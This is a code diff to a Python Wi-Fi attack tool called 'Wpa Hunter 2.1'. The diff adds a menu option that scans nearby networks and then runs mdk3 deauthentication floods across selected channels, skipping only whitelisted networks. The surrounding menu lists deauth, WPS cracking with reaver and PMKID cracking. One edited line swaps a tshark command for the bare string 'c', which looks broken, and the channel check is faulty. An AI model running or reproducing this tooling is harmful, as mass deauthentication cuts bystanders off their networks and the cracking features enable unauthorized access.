@@ -146,6 +146,40 @@ def hcxdumptool(interface):
     os.system("rm out.pcapng 2> /dev/zero")
     os.system("hcxdumptool -i %s -o out.pcapng --enable_status 1 --filterlist_ap=mac.txt --filtermode=2 >/dev/null 2>&1" % interface)
 
+def selectwhitelistednets():
+    df = pandas.read_csv('out-01.csv', skipinitialspace=True, usecols=['BSSID'])
+    df = df.to_string(justify="left").split("Station MAC", 1)[0]
+    df = df[:df.rfind('\n')].split("\n",1)[1]
+    macs = []
+    macs.append("None")
+    for line in df.splitlines():
+        macs.append(line[3:])
+    whitelisted_menu = TerminalMenu(macs,multi_select=True,show_multi_select_hint=False,title='\nSelect Whitelisted Network(s)\n')
+    whitelisted = whitelisted_menu.show()
+    wrt_file = open("whitelisted_nets.txt", "w")
+    for element in whitelisted_menu.chosen_menu_entries:
+        if element == "None":
+            break
+        else:
+            pass
+        wrt_file.write(element + "\n")
+    wrt_file.close()
+
+def selectblacklistedchannels():
+    global channels_menu
+    global channels
+    channels_menu = TerminalMenu(["All Channels","1","2","3","4","5","6","7","8","9","10","11","12","13"],multi_select=True,show_multi_select_hint=False,title='\nSelect Channels you want to attack\n')
+    channels = channels_menu.show()
+    if 'All Channels' in channels_menu.chosen_menu_entries:
+        if 'All Channels' and ('1' or '2' or '3' or '4' or '5' or '6' or '7' or '8' or '9' or '10' or '11' or '12' or '13') in channels_menu.chosen_menu_entries:
+            print(f"{Fore.RED}You cant select All Channels and other options!{Fore.RESET}")
+            time.sleep(2)
+            selectblacklistedchannels()
+        else:
+            pass
+    else:
+        pass
+
 rem()
 logo = f"""{Fore.GREEN}{Fore.RED}.         {Fore.RED}.
  {Fore.RED}: {Fore.LIGHTWHITE_EX}( {Fore.RED}* {Fore.LIGHTWHITE_EX}) {Fore.RED}:    {Fore.RED}┌─ {Fore.LIGHTBLUE_EX}Wpa Hunter 2.1
@@ -164,11 +198,12 @@ print(f"""{Fore.WHITE}[ {Fore.GREEN}1 {Fore.WHITE}] {Fore.WHITE}Deauth Network (
 {Fore.WHITE}[ {Fore.GREEN}7 {Fore.WHITE}] {Fore.WHITE}Wpa Supplicant
 {Fore.WHITE}[ {Fore.GREEN}8 {Fore.WHITE}] {Fore.WHITE}Crack WPS ( reaver )
 {Fore.WHITE}[ {Fore.GREEN}9 {Fore.WHITE}] {Fore.WHITE}Netdiscover
+{Fore.WHITE}[ {Fore.GREEN}10 {Fore.WHITE}] {Fore.WHITE}Deauth channel(s) ( mdk3 )
 {Fore.WHITE}[ {Fore.RED}x {Fore.WHITE}] {Fore.RED}Exit
 """)
 
 select = input(f"{Fore.WHITE}Choose > {Fore.RED}")
-while select not in ["1","2","3","4","5","6","7","8","9","x"]:
+while select not in ["1","2","3","4","5","6","7","8","9","10","x"]:
     print(f"{Fore.RED} Select valid option!")
     select = input(f"{Fore.WHITE}Choose > {Fore.RED}")
 
@@ -306,7 +341,7 @@ if select == "4":
         threading.Thread(target=hcxdumptool,args=[interface]).start()
         while True:
             time.sleep(2)
-            result = os.popen('tshark -r out.pcapng 2>/dev/null')
+            result = os.popen('c 2>/dev/null')
             if result.read().find("Message 2 of 4" or "Message 3 of 4" or "Message 4 of 4") !=-1:
                 print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.WHITE}PMKID Detected! Cracking and saving to {Fore.RED}cracked.txt{Fore.WHITE}...")
                 time.sleep(2)
@@ -470,6 +505,39 @@ if select == "9":
     print(f"{Fore.WHITE}")
     selectinterface()
     os.system("netdiscover -i " + interface)
+if select == "10":
+    os.system("clear")
+    print(logo)
+    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Select USB Wifi Card")
+    print(f"{Fore.WHITE}")
+    selectinterface()
+    monitormode(interface)
+    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
+    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
+    time.sleep(2)
+    os.system("airodump-ng -w out  --manufacturer --uptime --output-format csv " + interface)
+    os.system("clear")
+    displaynet()
+    selectwhitelistednets()
+    selectblacklistedchannels()
+    rem()
+    print("")
+    go = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.RED}Are you sure that you want to start the attack? (yes or no) : ")
+    print("")
+    if go == "yes":
+        pass
+    elif go == "no":
+        print(f"{Fore.RESET}")
+        exit()
+    else:
+        exit()
+    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Starting!{Fore.RED}")
+    mdk3_channels = str(channels).replace("(","").replace(")","")
+    if 'All Channels' in channels_menu.chosen_menu_entries:
+        os.system("mdk3 %s d -w whitelisted_nets.txt -c 1,2,3,4,5,6,7,8,9,10,11,12,13" % interface)
+    else:
+        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Deauthenticating channels {Fore.RED}%s" % mdk3_channels)
+        os.system("mdk3 %s d -w whitelisted_nets.txt -c %s" % (interface,mdk3_channels))
 
 if select == "x":
     print("")
